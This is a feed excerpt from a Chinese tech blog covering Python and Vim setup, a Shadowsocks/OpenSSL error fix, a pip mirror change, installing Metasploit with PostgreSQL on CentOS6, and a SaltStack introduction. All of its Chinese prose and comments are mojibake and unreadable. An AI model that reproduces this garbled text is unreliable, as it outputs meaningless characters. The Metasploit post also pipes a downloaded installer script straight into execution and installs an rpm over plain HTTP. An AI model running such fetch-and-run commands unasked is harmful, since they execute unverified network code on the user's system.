rel="noopener">stackoverflow</a></p><blockquote><p>åªæœ‰ä¸ªåˆ«å‘è¡Œç‰ˆä¸­Vimä¼šä¸ç¼–è¯‘æ”¯æŒPython</p></blockquote><h2 id="é™„åŠ ï¼š-pythonäº¤äº’æ¨¡å¼ä¸­ä»£ç è‡ªåŠ¨è¡¥å…¨ï¼ŒåŠç¬”è€…-vimrcé…ç½®æ–‡ä»¶"><a href="#é™„åŠ ï¼š-pythonäº¤äº’æ¨¡å¼ä¸­ä»£ç è‡ªåŠ¨è¡¥å…¨ï¼ŒåŠç¬”è€…-vimrcé…ç½®æ–‡ä»¶" class="headerlink" title="é™„åŠ ï¼š pythonäº¤äº’æ¨¡å¼ä¸­ä»£ç è‡ªåŠ¨è¡¥å…¨ï¼ŒåŠç¬”è€….vimrcé…ç½®æ–‡ä»¶"></a>é™„åŠ ï¼š pythonäº¤äº’æ¨¡å¼ä¸­ä»£ç è‡ªåŠ¨è¡¥å…¨ï¼ŒåŠç¬”è€…<code>.vimrc</code>é…ç½®æ–‡ä»¶</h2><p>å®¶ç›®å½•å†™å…¥<code>.pythontab</code>æ–‡ä»¶</p><p><code>vim ~/.pythontab</code></p><figure class="highlight python"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></div><div class="code"><pre><div class="line"><span class="comment"># python startup file</span></div><div class="line"><span class="comment"># -*- coding: utf8 -*-</span></div><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">import</span> readline</div><div class="line"><span class="keyword">import</span> rlcompleter</div><div class="line"><span class="keyword">import</span> atexit</div><div class="line"><span class="keyword">import</span> os</div><div class="line"><span class="comment"># tab completion</span></div><div class="line">readline.parse_and_bind(<span class="string">'tab: complete'</span>)<span class="comment">#tabé”®å¯è‡ªå®šä¹‰</span></div><div class="line"><span class="comment"># history file</span></div><div class="line">histfile = os.path.join(os.environ[<span class="string">'HOME'</span>], <span class="string">'.pythonhistory'</span>)</div><div class="line"><span class="keyword">try</span>:</div><div class="line">    readline.read_history_file(histfile)</div><div class="line"><span class="keyword">except</span> IOError:</div><div class="line">    <span class="keyword">pass</span></div><div class="line">atexit.register(readline.write_history_file, histfile)</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">del</span> os, histfile, readline, rlcompleter</div></pre></div></div></figure><p><code>chmod +x .pythontab</code></p><p>ç¼–è¾‘<code>~/.bashrc</code>æ–‡ä»¶åŠ å…¥ç¯å¢ƒå˜é‡</p><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"export PYTHONSTARTUP=~/.pythontab"</span> &gt;&gt; ~/.bashrc &amp;&amp; <span class="built_in">source</span> ~/.bashrc</div></pre></div></div></figure><p><strong>æµ‹è¯•ï¼š</strong></p><blockquote><p>åŒå‡»tabé”®è¡¥å…¨,å¯æ›´æ”¹åœ¨<code>~/.pythontab</code>æ–‡ä»¶ä¸­æœ‰åšæ³¨é‡Š</p></blockquote><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></div><div class="code"><pre><div class="line">kionf@kionf-pc[18:23]~:$ python</div><div class="line">Python 2.7.12+ (default, Aug  4 2016, 20:04:34) </div><div class="line">[GCC 6.1.1 20160724] on linux2</div><div class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> or <span class="string">"license"</span> <span class="keyword">for</span> more information.</div><div class="line">&gt;&gt;&gt; import random</div><div class="line">&gt;&gt;&gt; random.</div><div class="line">random.BPF                  random.__reduce__(          random.betavariate(</div><div class="line">random.LOG4                 random.__reduce_ex__(       random.choice(</div><div class="line">random.NV_MAGICCONST        random.__repr__(            random.division</div><div class="line">..........................................................................</div><div class="line">random.__package__          random._warn(               </div><div class="line">&gt;&gt;&gt; random.</div></pre></div></div></figure><p><strong>.vimrcé…ç½®æ–‡ä»¶</strong></p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">set</span> nocompatible                <span class="string">" be iMproved</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">set tabstop=4"</span>tabé”®ä¸º4ä¸ªç©ºæ ¼</div><div class="line"><span class="built_in">set</span> shiftwidth=4</div><div class="line"><span class="built_in">set</span> expandtab</div><div class="line"><span class="built_in">set</span> nu  <span class="string">"æ˜¾ç¤ºè¡Œå·ï¼Œå¤åˆ¶çš„æ—¶å€™å¯ä»¥:set nu!æ¥å–æ¶ˆæ˜¾ç¤º</span></div><div class="line"><span class="string">syntax on</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">filetype off                    "</span> required!</div><div class="line"><span class="built_in">set</span> rtp+=~/.vim/bundle/vundle/</div><div class="line">call vundle<span class="comment">#rc()</span></div><div class="line"></div><div class="line"><span class="string">"my Bundle here:</span></div><div class="line"><span class="string">Bundle 'Valloric/YouCompleteMe'</span></div><div class="line"><span class="string">Plugin 'Yggdroot/indentLine'</span></div><div class="line"><span class="string">Plugin 'Chiel92/vim-autoformat'</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">filetype plugin indent on</span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string"></span></div><div class="line"><span class="string">"</span> hot key</div><div class="line">noremap &lt;F3&gt; :Autoformat&lt;CR&gt;    <span class="string">"è‡ªåŠ¨ç¼©è¿›</span></div><div class="line"><span class="string">nnoremap &lt;silent&gt; &lt;F2&gt; :!clear;python %&lt;CR&gt;  "</span>è°ƒè¯•pythonæ–‡ä»¶vimä¸‹F2è¿è¡Œå½“å‰æ–‡ä»¶</div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Vim </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>ShadowSockså¯åŠ¨æŠ¥é”™undefined symbol EVP_CIPHER_CTX_cleanup</title>
      <link href="/2016/12/15/errornote-ss/"/>
      <url>/2016/12/15/errornote-ss/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>è§£å†³opensslå‡çº§åˆ°1.1.0ä»¥ä¸Šç‰ˆæœ¬ï¼Œå¯¼è‡´shadowsocks2.8.2å¯åŠ¨æŠ¥undefined symbol: EVP_CIPHER_CTX_cleanupé”™è¯¯ã€‚</p></blockquote><a id="more"></a><h2 id="å‡†å¤‡ç¿»å¢™å†²æµªçš„æ—¶å€™ShadowsocksæŠ¥é”™å¦‚ä¸‹ï¼š"><a href="#å‡†å¤‡ç¿»å¢™å†²æµªçš„æ—¶å€™ShadowsocksæŠ¥é”™å¦‚ä¸‹ï¼š" class="headerlink" title="å‡†å¤‡ç¿»å¢™å†²æµªçš„æ—¶å€™ShadowsocksæŠ¥é”™å¦‚ä¸‹ï¼š"></a>å‡†å¤‡ç¿»å¢™å†²æµªçš„æ—¶å€™ShadowsocksæŠ¥é”™å¦‚ä¸‹ï¼š</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></div><div class="code"><pre><div class="line">AttributeError: /usr/<span class="built_in">local</span>/ssl/lib/libcrypto.so.1.1: undefined symbol: EVP_CIPHER_CTX_cleanup</div><div class="line">shadowsocks start failed</div></pre></div></div></figure><h2 id="è§£å†³æ–¹æ³•-ï¼š"><a href="#è§£å†³æ–¹æ³•-ï¼š" class="headerlink" title="è§£å†³æ–¹æ³• ï¼š"></a>è§£å†³æ–¹æ³• ï¼š</h2><h3 id="1-vimæ‰“å¼€æ–‡ä»¶openssl-py"><a href="#1-vimæ‰“å¼€æ–‡ä»¶openssl-py" class="headerlink" title="1. vimæ‰“å¼€æ–‡ä»¶openssl.py"></a>1. vimæ‰“å¼€æ–‡ä»¶openssl.py</h3><p><code>vim /usr/local/lib/python3.5/dist-packages/shadowsocks/crypto/openssl.py</code></p><blockquote><p>è·¯å¾„ä¸åŒæ ¹æ®æŠ¥é”™è·¯å¾„è€Œå®š</p></blockquote><h3 id="2-ä¿®æ”¹libcrypto-EVP-CIPHER-CTX-cleanup-argtypes"><a href="#2-ä¿®æ”¹libcrypto-EVP-CIPHER-CTX-cleanup-argtypes" class="headerlink" title="2. ä¿®æ”¹libcrypto.EVP_CIPHER_CTX_cleanup.argtypes"></a>2. ä¿®æ”¹libcrypto.EVP_CIPHER_CTX_cleanup.argtypes</h3><p><code>:%s/cleanup/reset/</code></p><p><code>:x</code></p><blockquote><p>ä»¥ä¸Šä¸¤æ¡ä¸ºVIMå‘½ä»¤ï¼Œ æ›¿æ¢æ–‡ä¸­<strong>libcrypto.EVP_CIPHER_CTX_cleanup.argtypes</strong> ä¸º<strong>libcrypto.EVP_CIPHER_CTX_reset.argtypes </strong>å…±ä¸¤å¤„ï¼Œå¹¶ä¿å­˜</p></blockquote><h3 id="3-è¿è¡ŒShadowsocks"><a href="#3-è¿è¡ŒShadowsocks" class="headerlink" title="3. è¿è¡ŒShadowsocks"></a>3. è¿è¡ŒShadowsocks</h3><p>OK</p><h2 id="åŸå› ï¼š"><a href="#åŸå› ï¼š" class="headerlink" title="åŸå› ï¼š"></a>åŸå› ï¼š</h2><p>è¿™ä¸ªé—®é¢˜æ˜¯ç”±äºåœ¨openssl1.1.0ç‰ˆæœ¬ä¸­ï¼ŒåºŸå¼ƒäº†EVP_CIPHER_CTX_cleanupå‡½æ•°ï¼Œå¦‚å®˜ç½‘ä¸­æ‰€è¯´ï¼š</p><blockquote><p>EVP_CIPHER_CTX was made opaque in OpenSSL 1.1.0. As a result, EVP_CIPHER_CTX_reset() appeared and EVP_CIPHER_CTX_cleanup() disappeared. EVP_CIPHER_CTX_init() remains as an alias for EVP_CIPHER_CTX_reset().</p><p><strong>EVP_CIPHER_CTX_resetå‡½æ•°æ›¿ä»£äº†EVP_CIPHER_CTX_cleanupå‡½æ•°</strong></p></blockquote><p>EVP_CIPHER_CTX_resetå‡½æ•°è¯´æ˜ï¼š</p><blockquote><p>EVP_CIPHER_CTX_reset() clears all information from a cipher context and free up any allocated memory associate with it, except the ctx itself. This function should be called anytime ctx is to be reused for another EVP_CipherInit() / EVP_CipherUpdate() / EVP_CipherFinal() series of calls.</p></blockquote><p>EVP_CIPHER_CTX_cleanupå‡½æ•°è¯´æ˜ï¼š</p><blockquote><p>EVP_CIPHER_CTX_cleanup() clears all information from a cipher context and free up any allocated memory associate with it. It should be called after all operations using a cipher are complete so sensitive information does not remain in memory.</p></blockquote><p><strong>å¯ä»¥çœ‹å‡ºï¼ŒäºŒè€…åŠŸèƒ½åŸºæœ¬ä¸Šç›¸åŒï¼Œéƒ½æ˜¯é‡Šæ”¾å†…å­˜ï¼Œåªæ˜¯åº”è¯¥è°ƒç”¨çš„æ—¶æœºç¨æœ‰ä¸åŒï¼Œæ‰€ä»¥ç”¨resetä»£æ›¿cleanupé—®é¢˜ä¸å¤§ã€‚</strong></p><h2 id="æç¤ºï¼š"><a href="#æç¤ºï¼š" class="headerlink" title="æç¤ºï¼š"></a>æç¤ºï¼š</h2><p>openssl1.1.0ç›®å‰å…¼å®¹æ€§å¾ˆä¸å¥½ï¼Œå¤§éƒ¨åˆ†çš„è½¯ä»¶éƒ½ä¸æ”¯æŒ<br>ç›®å‰æ”¯æŒçš„æœ‰nginx-1.11.5ã€curl-7.50.3<br>ä¸æ”¯æŒçš„æœ‰PHP-7.0.12ã€openssh-7.3p1<br>æ‰€ä»¥å¦‚æœå†³å®šä½¿ç”¨openssl1.1.0éœ€è¦è€ƒè™‘å¾ˆå¤šå…¼å®¹é—®é¢˜ï¼Œå¿…é¡»ä¿ç•™1.0.2æˆ–1.0.1(ä¸æ¨èï¼Œå­˜åœ¨ä¸€äº›å·²çŸ¥æ¼æ´ï¼Œæœ€é‡è¦çš„æ˜¯å¦‚æœæœåŠ¡å™¨è¦å¼€http2ï¼Œç”±äºæ–°ç‰ˆchromeå¿…é¡»ä½¿ç”¨ALPNçš„é™åˆ¶ï¼Œåªæœ‰1.0.2ç‰ˆæœ¬æ”¯æŒALPNï¼Œæ‰€ä»¥å¿…é¡»å‡çº§åˆ°1.0.2)ç‰ˆæœ¬ä»¥ä¾¿ç¼–è¯‘å…¶ä»–ç¨‹åºã€‚</p>]]></content>
      
      <categories>
          
          <category> ErrorNote </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>æ›´æ”¹pipæºä¸ºå›½å†…é˜¿é‡Œæº</title>
      <link href="/2016/12/15/linux-pip/"/>
      <url>/2016/12/15/linux-pip/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>pipé»˜è®¤æºä¸ºå›½å¤–ï¼Œsoæé«˜ä¸‹è½½é€Ÿåº¦æ›´æ¢å›½å†…é˜¿é‡Œæºï¼ŒåŠaptæºã€å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦ï¼ŒåºŸè¯ä¸å¤šç›´è¿›ä¸»é¢˜</p></blockquote><a id="more"></a><h2 id="1-åˆ›å»ºé…ç½®æ–‡ä»¶"><a href="#1-åˆ›å»ºé…ç½®æ–‡ä»¶" class="headerlink" title="1. åˆ›å»ºé…ç½®æ–‡ä»¶"></a>1. åˆ›å»ºé…ç½®æ–‡ä»¶</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">mkdir ~/.pip/ &amp;&amp; <span class="built_in">cd</span> ~/.pip/; vim pip.conf</div></pre></div></div></figure><h2 id="2-æ·»åŠ é˜¿é‡Œæº"><a href="#2-æ·»åŠ é˜¿é‡Œæº" class="headerlink" title="2. æ·»åŠ é˜¿é‡Œæº"></a>2. æ·»åŠ é˜¿é‡Œæº</h2><p>æ·»åŠ å¦‚ä¸‹å†…å®¹</p><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></div><div class="code"><pre><div class="line">[global]</div><div class="line">index-url = http://mirrors.aliyun.com/pypi/simple/</div><div class="line"></div><div class="line">[install]</div><div class="line">trusted-host=mirrors.aliyun.com</div></pre></div></div></figure><h2 id="3-æµ‹è¯•"><a href="#3-æµ‹è¯•" class="headerlink" title="3. æµ‹è¯•"></a>3. æµ‹è¯•</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></div><div class="code"><pre><div class="line">root@kalivi[12:13].pip:<span class="comment"># pip install --upgrade pip</span></div><div class="line">You are using pip version 7.1.0, however version 9.0.1 is available.</div><div class="line">You should consider upgrading via the <span class="string">'pip install --upgrade pip'</span> <span class="built_in">command</span>.</div><div class="line">Collecting pip</div><div class="line">  Downloading http://mirrors.aliyun.com/pypi/packages/b6/ac/7015eb97dc749283ffdec1c3a88ddb8ae03b8fad0f0e611408f196358da3/pip-9.0.1-py2.py3-none-any.whl (1.3MB)</div><div class="line">    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1.3MB 5.0MB/s </div><div class="line">Installing collected packages: pip</div><div class="line">  Found existing installation: pip 7.1.0</div><div class="line">    Uninstalling pip-7.1.0:</div><div class="line">      Successfully uninstalled pip-7.1.0</div><div class="line">Successfully installed pip-9.0.1</div></pre></div></div></figure><h2 id="é™„ä¸Škali-rollingæ¸…åå¤§å­¦apté•œåƒæº"><a href="#é™„ä¸Škali-rollingæ¸…åå¤§å­¦apté•œåƒæº" class="headerlink" title="é™„ä¸Škali rollingæ¸…åå¤§å­¦apté•œåƒæº"></a>é™„ä¸Škali rollingæ¸…åå¤§å­¦apté•œåƒæº</h2><blockquote><p>deb <a href="http://mirrors.tuna.tsinghua.edu.cn/kali" target="_blank" rel="noopener">http://mirrors.tuna.tsinghua.edu.cn/kali</a> kali-rolling main non-free contrib</p></blockquote><h2 id="å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦"><a href="#å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦" class="headerlink" title="å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦"></a>å®šåˆ¶bashå‘½ä»¤è¡Œæç¤ºç¬¦</h2><figure class="highlight sh"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="built_in">echo</span> <span class="string">"PS1='\[\e[31m\]\u@\h\[\e[m\][\A]\[\e[34m\]\W:\[\e[34m\]\$\[\e[m\] '"</span> &gt;&gt; ~/.bashrc &amp;&amp; <span class="built_in">source</span> ~/.bashrc</div><div class="line"></div><div class="line">root@kalivi[12:23]~:<span class="comment">#</span></div></pre></div></div></figure>]]></content>
      
      <categories>
          
          <category> Linux </category>
          
          <category> pip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pip </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>RedHat6/CentOS6 å®‰è£…Metasploit</title>
      <link href="/2016/12/06/kali-metasploit/"/>
      <url>/2016/12/06/kali-metasploit/</url>
      <content type="html"><![CDATA[<p><img src="https://kionf.com/article_images/banner.png" alt="kionf"></p><blockquote><p>æœ¬ç« è®°å½•åœ¨RedHat6/CentOS6ä¸Šå®‰è£…Metasploitï¼Œå› ä¸ºå‘é˜Ÿå‹ç»™äº†å°Redhat6ç³»ç»Ÿçš„äº‘ä¸»æœºã€‚åªèƒ½è‡ªå·±æèµ·æ¥äº†</p></blockquote><a id="more"></a><h2 id="1-Metasploit"><a href="#1-Metasploit" class="headerlink" title="1. Metasploit"></a>1. Metasploit</h2><p><strong>msfè¿™éƒ¨åˆ†<code>msfinstall</code>è„šæœ¬ä¼šè‡ªåŠ¨æ¥å®‰è£…ï¼Œæ‰€ä»¥éœ€è¦é…ç½®çš„ä¹Ÿæ¯”è¾ƒå°‘</strong></p><p>ä¸‹è½½å®˜æ–¹æä¾›çš„å®‰è£…è„šæœ¬ï¼Œå¹¶æ‰§è¡Œ</p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp;   chmod 755 msfinstall &amp;&amp;   ./msfinstall</div></pre></div></div></figure><blockquote><p>é™é™ç­‰å¾…å®ƒä¸‹è½½å®Œã€‚ã€‚ã€‚<code>msfinstall</code>è„šæœ¬åªä¼šå®‰è£…metasploitï¼Œä¸ä¼šå®‰è£…postgresql</p></blockquote><h2 id="2-Postgresql"><a href="#2-Postgresql" class="headerlink" title="2. Postgresql"></a>2. Postgresql</h2><p><code>yum -y install postgresql postgresql-server</code></p><blockquote><p>è¿™é‡Œæˆ‘ä½¿ç”¨çš„æ˜¯epelæº<br> <code>rpm -ivh http://dl.fedoraproject.org/pub/epel/6Server/x86_64/epel-release-6-8.noarch.rpm</code><br> <code>yum clean all &amp;&amp; yum makecache</code></p></blockquote><h2 id="3-é…ç½®Postgresql"><a href="#3-é…ç½®Postgresql" class="headerlink" title="3. é…ç½®Postgresql"></a>3. é…ç½®Postgresql</h2><h3 id="1-æ·»åŠ æ•°æ®åº“ï¼Œç”¨æˆ·"><a href="#1-æ·»åŠ æ•°æ®åº“ï¼Œç”¨æˆ·" class="headerlink" title="(1)æ·»åŠ æ•°æ®åº“ï¼Œç”¨æˆ·"></a>(1)æ·»åŠ æ•°æ®åº“ï¼Œç”¨æˆ·</h3><p><strong>åˆå§‹åŒ–å¯åŠ¨ :</strong></p><p><code>service postgresql initdb</code></p><p><code>service postgresql start</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">åˆ‡æ¢åˆ°æ™®é€šç”¨æˆ·</span></div><div class="line">su - postgres</div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash">åˆ›å»ºæ•°æ®åº“å’Œç”¨æˆ·</span></div><div class="line">psql</div><div class="line"></div><div class="line">postgres=# create user "youruser" with password 'yourpasswd' nocreatedb;</div><div class="line">CREATE ROLE</div><div class="line"></div><div class="line">postgres=# create database "msf4" with owner="youruser";</div><div class="line">CREATE DATABASE</div><div class="line"></div><div class="line">postgres=# \q</div><div class="line">é€€å‡º</div></pre></div></div></figure><h3 id="2-ä¿®æ”¹æœåŠ¡é…ç½®æ–‡ä»¶"><a href="#2-ä¿®æ”¹æœåŠ¡é…ç½®æ–‡ä»¶" class="headerlink" title="(2)ä¿®æ”¹æœåŠ¡é…ç½®æ–‡ä»¶"></a>(2)ä¿®æ”¹æœåŠ¡é…ç½®æ–‡ä»¶</h3><p><code>åˆ‡æ¢å›root</code></p><p><code>vim /var/lib/pgsql/data/postgresql.conf</code></p><blockquote><p>åœ¨æˆ‘çš„æœºå™¨ä¸Šæ˜¯è¿™ä¸ªæ–‡ä»¶ï¼Œæœ‰å¯èƒ½ä¼šä¸åŒï¼Œåå­—ä¸€æ ·è‡ªè¡ŒæŸ¥æ‰¾</p></blockquote><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">å…±ä¿®æ”¹2å¤„</span></div><div class="line"></div><div class="line">æ›´æ”¹ #listen_addresses = 'localhost'</div><div class="line">ä¸º listen_addresses = '127.0.0.1'</div><div class="line"></div><div class="line">æ›´æ”¹ #password_encryption = on</div><div class="line">ä¸º password_encryption = on</div></pre></div></div></figure><p><code>vim /var/lib/pgsql/data/pg_hba.conf</code></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">æ–‡ä»¶æœ«å°¾å¤„</span></div><div class="line">æ›´æ”¹ host    all         all         127.0.0.1/32          ident</div><div class="line">ä¸º host    all         all         127.0.0.1/32          md5</div></pre></div></div></figure><h3 id="3-é‡å¯æœåŠ¡"><a href="#3-é‡å¯æœåŠ¡" class="headerlink" title="(3)é‡å¯æœåŠ¡"></a>(3)é‡å¯æœåŠ¡</h3><p><code>service postgresql restart</code></p><p><code>psql -U youruser -h 127.0.0.1 -dmsf4</code></p><p><strong>æµ‹è¯•æ˜¯å¦é…ç½®æˆåŠŸ</strong></p><h2 id="4-é…ç½®Metasploit"><a href="#4-é…ç½®Metasploit" class="headerlink" title="4. é…ç½®Metasploit"></a>4. é…ç½®Metasploit</h2><p><code>vim /root/.msf4/database.yml</code></p><p><strong>æ·»åŠ å¦‚ä¸‹å†…å®¹</strong></p><figure class="highlight shell"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></div><div class="code"><pre><div class="line">production:</div><div class="line">  adapter: "postgresql"</div><div class="line">  database: "msf4"</div><div class="line">  username: "youruser"</div><div class="line">  password: "yourpasswd"</div><div class="line">  host: "127.0.0.1"</div><div class="line">  port: 5432</div><div class="line">  pool: 5</div><div class="line">  timeout: 5</div></pre></div></div></figure><p><code>cp /root/.msf4/database.yml /var/lib/pgsql/.msf4/database.yml</code></p><blockquote><p>msfåˆå§‹åŒ–æ•°æ®åº“</p></blockquote><p><code>su - postgres</code></p><p><code>msfdb init</code></p><h2 id="5-è¿è¡Œmsf"><a href="#5-è¿è¡Œmsf" class="headerlink" title="5. è¿è¡Œmsf"></a>5. è¿è¡Œmsf</h2><p><code>msfconsole</code></p><p><strong>æŸ¥çœ‹æ•°æ®åº“è¿æ¥çŠ¶æ€</strong></p><p><code>msf &gt; db_status</code></p><p><code>[*] postgresql connected to msf4</code>#è¡¨ç¤ºè¿æ¥æˆåŠŸ</p><blockquote><p>å½“ä½¿ç”¨searchæœç´¢æ¨¡æ¿ä¼šæç¤º<code>[!] Module database cache not built yet, using slow search</code>æ„æ€æ˜¯æ•°æ®åº“æ²¡æœ‰å»ºç«‹ç¼“å­˜</p></blockquote><p><code>msf &gt; db_rebuild_cache</code></p><p>è¿™æ ·å°±ä¼šåœ¨åå°å»ºç«‹æ•°æ®åº“ç¼“å­˜äº†ï¼Œè‡³æ­¤å…¨éƒ¨å®‰è£…é…ç½®å·²å®Œæˆã€‚åé¢ä¼šå†™ä¸€å†™å…³äºmetasploitçš„åº”ç”¨ã€‚</p>]]></content>
      
      <categories>
          
          <category> Sec </category>
          
          <category> metasploit </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Linux è‡ªåŠ¨åŒ–è¿ç»´ä¹‹SlatStackå®‰è£…</title>
      <link href="/2016/07/18/linux-saltstack01/"/>
      <url>/2016/07/18/linux-saltstack01/</url>
      <content type="html"><![CDATA[<blockquote class="blockquote-center"><p>slatstackå…¥é—¨å®‰è£… </p></blockquote><a id="more"></a><h1 id="saltstackåŸºæœ¬åŸç†ï¼š"><a href="#saltstackåŸºæœ¬åŸç†ï¼š" class="headerlink" title="saltstackåŸºæœ¬åŸç†ï¼š"></a>saltstackåŸºæœ¬åŸç†ï¼š</h1><blockquote><p><code>SaltStack</code>é‡‡ç”¨ C/Sæ¨¡å¼ï¼Œserverç«¯å°±æ˜¯saltçš„<code>master</code>ï¼Œclientç«¯å°±æ˜¯<code>minion</code>ï¼Œminionä¸masterä¹‹é—´é€šè¿‡ZeroMQæ¶ˆæ¯é˜Ÿåˆ—é€šä¿¡ï¼Œ<strong>æ˜¯ä¸€ä¸ªåŒæ—¶å¯¹ä¸€ç»„æœåŠ¡å™¨è¿›è¡Œè¿œç¨‹æ‰§è¡Œå‘½ä»¤å’ŒçŠ¶æ€ç®¡ç†çš„å·¥å…·ã€‚</strong></p></blockquote><blockquote><p>minionä¸Šçº¿åå…ˆä¸masterç«¯è”ç³»ï¼ŒæŠŠè‡ªå·±çš„<code>pub key</code>å‘è¿‡å»ï¼Œè¿™æ—¶masterç«¯é€šè¿‡salt-key -Lå‘½ä»¤å°±ä¼šçœ‹åˆ°minionçš„keyï¼Œæ¥å—è¯¥minion-keyåï¼Œä¹Ÿå°±æ˜¯masterä¸minionå·²ç»äº’ä¿¡</p></blockquote><blockquote><p> <code>master</code>å¯ä»¥å‘é€ä»»ä½•æŒ‡ä»¤è®©<code>minion</code>æ‰§è¡Œäº†ï¼Œsaltæœ‰å¾ˆå¤šå¯æ‰§è¡Œæ¨¡å—ï¼Œæ¯”å¦‚è¯´cmdæ¨¡å—ï¼Œåœ¨å®‰è£…minionçš„æ—¶å€™å·²ç»è‡ªå¸¦äº†ï¼Œå®ƒä»¬é€šå¸¸ä½äºä½ çš„pythonåº“ä¸­ï¼Œ<code>locate salt | grep /usr/</code>å¯ä»¥çœ‹åˆ°saltè‡ªå¸¦çš„æ‰€æœ‰ä¸œè¥¿ã€‚</p></blockquote><blockquote><p> è¿™äº›æ¨¡å—æ˜¯pythonå†™æˆçš„æ–‡ä»¶ï¼Œé‡Œé¢ä¼šæœ‰å¥½å¤šå‡½æ•°ï¼Œå¦‚cmd.runï¼Œå½“æˆ‘ä»¬æ‰§è¡Œ<code>salt &#39;*&#39; cmd.run &#39;uptime&#39;</code>çš„æ—¶å€™ï¼Œmasterä¸‹å‘ä»»åŠ¡åŒ¹é…åˆ°çš„minionä¸Šå»ï¼Œminionæ‰§è¡Œæ¨¡å—å‡½æ•°ï¼Œå¹¶è¿”å›ç»“æœã€‚masterç›‘å¬<strong>4505</strong>å’Œ<strong>4506</strong>ç«¯å£ï¼Œ4505å¯¹åº”çš„æ˜¯ZMQçš„PUB systemï¼Œç”¨æ¥å‘é€æ¶ˆæ¯ï¼Œ4506å¯¹åº”çš„æ˜¯REP systemæ˜¯æ¥æ¥å—æ¶ˆæ¯çš„ã€‚</p></blockquote><h3 id="å…·ä½“æ­¥éª¤å¦‚ä¸‹"><a href="#å…·ä½“æ­¥éª¤å¦‚ä¸‹" class="headerlink" 